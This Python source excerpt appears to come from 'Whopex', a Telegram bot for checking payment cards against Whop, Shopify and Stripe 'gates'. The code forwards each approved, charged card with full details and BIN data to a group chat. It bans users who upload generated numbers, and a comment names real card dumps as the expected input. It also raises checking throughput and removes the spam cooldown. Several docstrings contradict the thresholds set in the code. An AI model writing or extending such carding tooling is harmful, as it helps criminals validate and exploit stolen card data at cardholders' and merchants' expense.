def wpe(key: str) -> str:
    """Wrap a Whop premium emoji ID into Telegram's premium emoji HTML tag.

    Falls back to a visible ASCII emoji character so the message still renders
    nicely if the custom emoji is unavailable.
    """
    eid = WE.get(key)
    if not eid:
        return ""
    return f'<tg-emoji emoji-id="{eid}">✨</tg-emoji>'

# ══════════════════════════════════════════════════════════════════════════════
#  AUTO-CHARGED FORWARDER (ALL gates, ALL users)
#  Shared by Whop, Shopify, and Stripe — forwards every APPROVED card to the
#  charged group with full details. Defined HERE (not in a gate module) because
#  it uses the `bot` instance and shared utilities.
# ══════════════════════════════════════════════════════════════════════════════
_charged_forward_lock = asyncio.Lock()


def _charged_group_allowed(user_id: int | None) -> bool:
    """Owner's approved cards NEVER go to the charged group.

    Only regular users and admins get their APPROVED cards posted to the
    charged group (with full details). If the checker is the OWNER the
    post is skipped silently — the owner still sees their own result in
    chat, it just never lands in the group.
    """
    try:
        uid = int(user_id)
    except (TypeError, ValueError):
        return True
    try:
        if getattr(auth, "OWNER_ID", None) is not None and uid == int(auth.OWNER_ID):
            return False
    except Exception:
        pass
    try:
        if hasattr(auth, "is_owner") and auth.is_owner(uid):
            return False
    except Exception:
        pass
    return True


async def _send_charged_group(user_id: int | None, text: str) -> None:
    """Owner-safe direct sender to the charged group.

    Skips silently when the card was checked by the OWNER; otherwise posts
    the text (with details) and absorbs every Telegram error so callers'
    existing try/except blocks keep working unchanged.
    """
    if not _charged_group_allowed(user_id):
        try:
            log.info("[Charged Forward] Skipped — owner card (user %s) never posts "
                     "to charged group %s", user_id, CHARGED_FORWARD_GROUP_ID)
        except Exception:
            pass
        return
    try:
        await bot.send_message(CHARGED_FORWARD_GROUP_ID, text,
                               disable_web_page_preview=True)
    except TelegramRetryAfter as r:
        await asyncio.sleep(r.retry_after + 0.5)
        try:
            await bot.send_message(CHARGED_FORWARD_GROUP_ID, text,
                                   disable_web_page_preview=True)
        except Exception as e:
            log.error("[Charged Forward] retry failed: %s", e)
    except Exception as e:
        log.error("[Charged Forward] send failed: %s", e)


async def _forward_charged_group(*, card: str, price: str, gate: str,
                                  response: str, user_id: int,
                                  user_name: str, user_uname: str,
                                  bin_info: dict | None = None,
                                  elapsed: float = 0.0):
    """Forward every APPROVED card to the charged group with FULL details.

    Called from ALL gates (Whop, Shopify, Stripe ST) when a card is APPROVED.
    Includes: card, price, gate, response, BIN info, user who checked it.
    OWNER cards are skipped — only users + admins land in the group.
    """
    if not _charged_group_allowed(user_id):
        log.info("[Charged Forward] Skipped — owner card %s (gate=%s) never posts "
                 "to charged group %s", str(card).split("|")[0], gate,
                 CHARGED_FORWARD_GROUP_ID)
        return
    try:
        uname_html = user_link(user_id, user_name, user_uname)
        sep = "─" * 30

        # Build BIN info block
        if bin_info and isinstance(bin_info, dict) and bin_info.get("brand"):
            bin_block = (
                f"{wpe('triple_ring')} {_to_bi('BIN Info:')}\n"
                f"{brand_emoji(bin_info.get('brand', '-'))}{_to_bi('Brand:')} {_to_bi(bin_info.get('brand', '-'))}\n"
                f"{wpe('arrow_right')} {_to_bi('Type:')} {_to_bi(bin_info.get('type', '-'))}\n"
                f"{wpe('arrow_right')} {_to_bi('Bank:')} {_to_bi(bin_info.get('bank', '-'))}\n"
                f"{wpe('arrow_right')} {_to_bi('Country:')} {bin_info.get('flag', '')} {_to_bi(bin_info.get('country', '-'))}\n\n"
            )
        else:
            bin_block = ""

        text = (
            f"{wpe('approved')} {_to_bi('CHARGED')} {wpe('approved')}\n\n"
            f"{wpe('card')} {_to_bi('CC:')} <code>{card}</code>\n"
            f"{wpe('amount')} {_to_bi('Price:')} {_to_bi(str(price))}\n"
            f"{wpe('time')} {_to_bi('Time:')} {_to_bi(f'{elapsed:.2f}s')}\n"
            f"{wpe('gem')} {_to_bi('Response:')} {_to_bi(str(response)[:120])}\n\n"
            f"{bin_block}"
            f"{_to_bi('Gate')}: {_to_bi(gate)}\n"
            f"{wpe('checked_by')} {_to_bi('Checked by:')} {uname_html}\n"
            f"{sep}\n"
            f"{wpe('sparkle')} {_to_bi('Whopex')}\n"
            f"{_to_bi('Made by @tatsuyo_001')}"
        )
        log.info("[Charged Forward] Sending APPROVED card %s to group %s (gate=%s)",
                 card.split("|")[0], CHARGED_FORWARD_GROUP_ID, gate)
        async with _charged_forward_lock:
            try:
                await bot.send_message(CHARGED_FORWARD_GROUP_ID, text,
                    parse_mode="HTML", disable_web_page_preview=True)
                log.info("[Charged Forward] Successfully sent to group %s",
                         CHARGED_FORWARD_GROUP_ID)
            except TelegramRetryAfter as r:
                log.warning("[Charged Forward] FloodWait %ss — retrying", r.retry_after)
                await asyncio.sleep(r.retry_after + 0.5)
                await bot.send_message(CHARGED_FORWARD_GROUP_ID, text,
                    parse_mode="HTML", disable_web_page_preview=True)
            except (TelegramBadRequest, TelegramForbiddenError) as e:
                log.error("[Charged Forward] FAILED to send to group %s: %s "
                          "(Make sure the bot is a member of the group and the ID is correct. "
                          "For supergroups, the ID must start with -100)",
                          CHARGED_FORWARD_GROUP_ID, e)
            except Exception as e:
                log.error("[Charged Forward] Unexpected error: %s", e)
    except Exception as e:
        log.error("[Charged Forward] _forward_charged_group crashed: %s", e)


# ── Ban system ────────────────────────────────────────────────────────────────
_banned_users: set[int] = set()

def _load_banned() -> None:
    global _banned_users
    try:
        with open(BANNED_FILE, "r", encoding="utf-8") as f:
            _banned_users = set(json.load(f))
    except Exception:
        _banned_users = set()

def _save_banned() -> None:
    try:
        with open(BANNED_FILE, "w", encoding="utf-8") as f:
            json.dump(sorted(_banned_users), f)
    except Exception as exc:
        log.error("Failed to save banned.json: %s", exc)

def is_banned(user_id: int) -> bool:
    return user_id in _banned_users

def ban_user(user_id: int) -> None:
    _banned_users.add(user_id)
    _save_banned()
    log.warning("BAN: user %s added to ban list", user_id)

def unban_user(user_id: int) -> None:
    _banned_users.discard(user_id)
    _save_banned()
    log.info("UNBAN: user %s removed from ban list", user_id)

_load_banned()

# ══════════════════════════════════════════════════════════════════════════════
#  v58 — USERNAME CACHE  (for /ban @username and /unban @username)
# ══════════════════════════════════════════════════════════════════════════════
# Telegram bots cannot resolve @username to a user_id via the Bot API.
# We work around this by silently caching every observed username → user_id
# pair from incoming messages.  When the owner does `/ban @someuser`, we
# look up the cached user_id for that username.  If the username was never
# seen by the bot, we fall back to a friendly error message asking the
# owner to reply to a message of that user instead.
#
# The cache is in-memory only (no disk file) — rebuilt on every bot
# restart from the next messages the bot sees.  This is intentionally
# lightweight: no I/O, no locks, no race conditions.
_USERNAME_CACHE: dict[str, int] = {}    # lowercase @username → user_id


def _cache_username(username: str, user_id: int) -> None:
    """Silently remember @username → user_id (best-effort, never raises)."""
    try:
        uname = (str(username or "")).strip().lstrip("@").lower()
        if not uname or not user_id:
            return
        # Never overwrite a real ID with a 0 / None.
        existing = _USERNAME_CACHE.get(uname)
        if existing and existing == int(user_id):
            return
        _USERNAME_CACHE[uname] = int(user_id)
    except Exception:
        pass


def _resolve_username_to_id(username: str) -> int:
    """Return the cached user_id for @username, or 0 when unknown."""
    try:
        uname = (str(username or "")).strip().lstrip("@").lower()
        if not uname:
            return 0
        return int(_USERNAME_CACHE.get(uname, 0))
    except Exception:
        return 0


def _cache_users_from_message(message: types.Message) -> None:
    """Pull every username + user_id we can see from an incoming update.

    Caches the sender, the replied-to user, and any text_mention entities
    in the message text.  Called from a low-priority router handler so it
    runs on every observed message without slowing down command handling.
    """
    try:
        if message is None:
            return
        # Sender
        if getattr(message, "from_user", None) is not None:
            fu = message.from_user
            if fu.username:
                _cache_username(fu.username, fu.id)
        # Replied message author
        if getattr(message, "reply_to_message", None) is not None:
            ru = getattr(message.reply_to_message, "from_user", None)
            if ru is not None and ru.username:
                _cache_username(ru.username, ru.id)
        # Forward-from user
        if getattr(message, "forward_origin", None) is not None:
            try:
                fo = message.forward_origin
                # aiogram 3.x: MessageOriginUser, MessageOriginHiddenUser, etc.
                sender_user = getattr(fo, "sender_user", None)
                if sender_user is not None and sender_user.username:
                    _cache_username(sender_user.username, sender_user.id)
            except Exception:
                pass
        # @mention entities in the message text
        try:
            ents = message.entities or []
        except Exception:
            ents = []
        for ent in ents:
            try:
                if ent.type == MessageEntityType.TEXT_MENTION:
                    tu = ent.user
                    if tu is not None and tu.username:
                        _cache_username(tu.username, tu.id)
            except Exception:
                pass
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════════
#  GEN-CHECKER AUTO-BAN — filename + CC-pattern detection
# ══════════════════════════════════════════════════════════════════════════════

# Filename patterns that flag a gen-checker upload.
# The regex captures the matched keyword so it can be shown in the ban reason.
_GEN_FILENAME_PATTERN = re.compile(
    r'(gen(?:erat(?:e|or|ed)?)?)',
    re.IGNORECASE,
)

# Card-pattern thresholds (checked against first 20 cards of any batch)
_GEN_SAMPLE_SIZE  = 20   # inspect the first N cards
_GEN_NUM_BAN_MIN  = 15   # same card NUMBER must repeat ≥ this many times → ban
_GEN_CVV_BAN_MIN  = 15   # same CVV must repeat ≥ this many times → ban


def detect_gen_ccs(cards: list[str]) -> str | None:
    """
    Analyse the first 20 cards for generator patterns.
    Returns a human-readable reason string when detected, None if clean.

    Rules (as specified):
      1. Any card NUMBER that repeats ≥7 times in the sample → ban
         (fewer than 6 identical numbers = allowed through)
      2. Any CVV value that repeats ≥3 times in the sample → ban
         (real card dumps have cryptographically unique CVVs; any triple hit
         in 20 samples is almost certainly a gen tool)
    """
    from collections import Counter

    sample = cards[:_GEN_SAMPLE_SIZE]
    if len(sample) < 5:           # too few cards to make a reliable call
        return None

    parsed: list[tuple[str, str]] = []   # (card_number, cvv)
    for card in sample:
        parts = card.split("|")
        if len(parts) >= 4:
            parsed.append((parts[0].strip(), parts[3].strip()))

    if len(parsed) < 5:
        return None

    num_cnt = Counter(p[0] for p in parsed)
    cvv_cnt = Counter(p[1] for p in parsed)

    # Rule 1: same card number ≥7 times
    top_num, top_num_n = num_cnt.most_common(1)[0]
    if top_num_n >= _GEN_NUM_BAN_MIN:
        return f"Card number repeated {top_num_n}× in first {len(parsed)} cards"

    # Rule 2: same CVV ≥3 times
    top_cvv, top_cvv_n = cvv_cnt.most_common(1)[0]
    if top_cvv_n >= _GEN_CVV_BAN_MIN:
        return f"CVV '{top_cvv}' repeated {top_cvv_n}× in first {len(parsed)} cards"

    return None


async def _do_gen_ban(message: types.Message, user_id: int, reason: str, filename: str = "") -> None:
    """Execute the ban, notify user + owner, and log."""
    ban_user(user_id)
    full_name = message.from_user.first_name or "?"

    ban_msg = await message.reply(
        f'<tg-emoji emoji-id="5447647474984449520">🚫</tg-emoji> '
        f'<b>You have been auto-banned.</b>\n'
        f'<tg-spoiler>{_html.escape(reason)}</tg-spoiler>',
        parse_mode="HTML",
    )
    try:
        await message.bot.pin_chat_message(
            message.chat.id, ban_msg.message_id, disable_notification=False
        )
    except Exception:
        pass

    file_line = (
        f'\n<tg-emoji emoji-id="5989971281758394805">📁</tg-emoji> '
        f'<b>File</b> ➜ <code>{_html.escape(filename)}</code>'
    ) if filename else ""
    notice = (
        f'<tg-emoji emoji-id="5116151848855667552">🚫</tg-emoji> <b>AUTO-BANNED</b>\n'
        f'━━━━━━━━━━━━━━━━━━━━━━\n'
        f'<tg-emoji emoji-id="5895421863114313930">👤</tg-emoji> <b>User</b> ➜ '
        f'<a href="tg://user?id={user_id}">{_html.escape(full_name)}</a> '
        f'(<code>{user_id}</code>)'
        f'{file_line}\n'
        f'<tg-emoji emoji-id="5447647474984449520">🚫</tg-emoji> <b>Reason</b> ➜ '
        f'<tg-spoiler>{_html.escape(reason)}</tg-spoiler>'
    )

    # Notify owner + all admins
    recipients: list[int] = []
    if auth.OWNER_ID:
        recipients.append(auth.OWNER_ID)
    for admin_id in auth.load_admins():
        if admin_id not in recipients:
            recipients.append(admin_id)

    for recipient in recipients:
        try:
            await message.bot.send_message(recipient, notice, parse_mode="HTML")
        except Exception:
            pass

    log.warning("AUTO-BAN: user %s – %s", user_id, reason)


async def guard_gen_filename(message: types.Message, user_id: int) -> bool:
    """
    Returns True and bans the user when the filename contains a gen/scrape
    keyword.  The matched word is extracted and shown in the ban reason.
    Returns False when the file is clean.  Owners always pass through.
    """
    if auth.is_owner(user_id):
        return False

    doc = message.document or (
        message.reply_to_message and message.reply_to_message.document
    )
    name = (doc.file_name if doc and doc.file_name else "").strip()

    m = _GEN_FILENAME_PATTERN.search(name)
    if not m:
        return False

    matched_word = m.group(1)           # e.g. "gen", "generate", "scrape"
    ban_reason = f'Gen Checker — filename contains "{matched_word}"'
    await _do_gen_ban(message, user_id, ban_reason, filename=name)
    return True


async def guard_gen_cards(cards: list[str], message: types.Message, user_id: int) -> bool:
    """
    Inspect the first 30 cards for generator patterns.
    Returns True when the batch is clean (check may proceed).
    Returns False and bans the user when a gen pattern is detected.
    Owners are always allowed through.
    """
    if auth.is_owner(user_id):
        return True

    reason = detect_gen_ccs(cards)
    if reason is None:
        return True

    await _do_gen_ban(message, user_id, f"Gen CC Detected — {reason}")
    return False


# ── Thread pool for sync gates (hit, st, chk, rz, st1, etc.) ─────────────────
# 8-core bot VPS: 500 threads handles concurrent sync gate workers with headroom.
CHECKER_POOL = concurrent.futures.ThreadPoolExecutor(max_workers=500)

# ── Per-user concurrency limiter for /msh (prevents one user starving others) ─
_USER_SEM_LIMIT = 100
_user_semaphores: dict[int, asyncio.Semaphore] = {}

def get_user_semaphore(user_id: int) -> asyncio.Semaphore:
    if user_id not in _user_semaphores:
        _user_semaphores[user_id] = asyncio.Semaphore(_USER_SEM_LIMIT)
    return _user_semaphores[user_id]

# ── Antispam cooldown (20s per user for /sh, /msh, /br) ──────────────────────
_ANTISPAM_COOLDOWN = 0   # antispam cooldown REMOVED — nobody ever waits
_user_last_cmd: dict[int, float] = {}

def check_cooldown(user_id: int) -> float:
    """Return remaining cooldown seconds, or 0 if the user is free to proceed."""
    if auth.is_admin(user_id):
        return 0.0
    last = _user_last_cmd.get(user_id, 0)
    elapsed = time.time() - last
    if elapsed < _ANTISPAM_COOLDOWN:
        return _ANTISPAM_COOLDOWN - elapsed
    return 0.0

def set_cooldown(user_id: int):
    _user_last_cmd[user_id] = time.time()

